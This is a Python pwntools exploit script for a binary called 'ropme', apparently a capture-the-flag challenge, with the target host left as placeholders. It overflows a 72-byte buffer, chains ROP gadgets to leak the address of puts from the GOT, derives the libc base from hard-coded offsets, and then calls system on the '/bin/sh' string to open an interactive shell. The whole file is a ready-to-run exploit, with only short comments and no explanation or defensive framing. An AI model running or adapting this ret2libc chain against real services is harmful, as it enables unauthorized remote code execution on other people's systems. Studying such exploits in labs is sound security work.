#! /usr/bin/env python3

from pwn import *
import argparse

# Prepare env

parser = argparse.ArgumentParser(description='Pwn Ropme')
parser.add_argument('--remote', '-r', action='store_true')
args = parser.parse_args()

context.binary = './ropme'
base_addresses = {
	'local': {
		'puts': 0x76210,
		'system': 0x49e10,
		'str_bin_sh': 0x18969b
	},
	'remote': {
		'puts': 0x6f690,
		'system': 0x45390,
		'str_bin_sh': 0x18cd17
	}
}
if(args.remote):
	process = remote('<MACHINE_IP>', <MACHINE_PORT>)
	base_addresses = base_addresses['remote']
else:
	process = process('./ropme')
	base_addresses = base_addresses['local']

# Start exploit

with log.progress('Leaking puts@glibc...') as p:
	junk = b'A' * 72
	pop_rdi = p64(0x4006d3) # Return address overwrite to move whatever pointed by RSP
	got_put = p64(0x601018) # Parameter pointed by RSP (Top of the stack), is the puts entry in the GOT table 
	put_call = p64(0x4004e0) # Return of pop call to execute puts with our parameter
	main_call = p64(0x400626) # Return to main softly to continue exploting with the address we got
	payload = junk + pop_rdi + got_put + put_call + main_call

	process.recvline('ROP me outside, how \'about dah?')
	process.sendline(payload)
	data = process.recvline()

	leaked_puts_raw = data.strip().ljust(8, b'\x00') # Make sure we have a 64 bits address (Adding missing 0s)
	leaked_puts = hex(u64(leaked_puts_raw))
	p.success(leaked_puts)

with log.progress('Getting a shell...') as p:
	glibc_address = int(leaked_puts, 16) - base_addresses['puts']

	junk = b'A' * 72
	pop_rdi = p64(0x4006d3) # Return address overwrite to move whatever pointed by RSP
	bin_bash_str = p64(glibc_address + base_addresses['str_bin_sh']) # Parameter pointed by RSP (Top of the stack), is the /bin/bash string
	system_call = p64(glibc_address + base_addresses['system']) # Return of pop call to execute system with our parameter
	payload = junk + pop_rdi + bin_bash_str + system_call

	process.recvline('ROP me outside, how \'about dah?')
	process.sendline(payload)
	p.success()

	process.interactive(prompt='')

process.close()
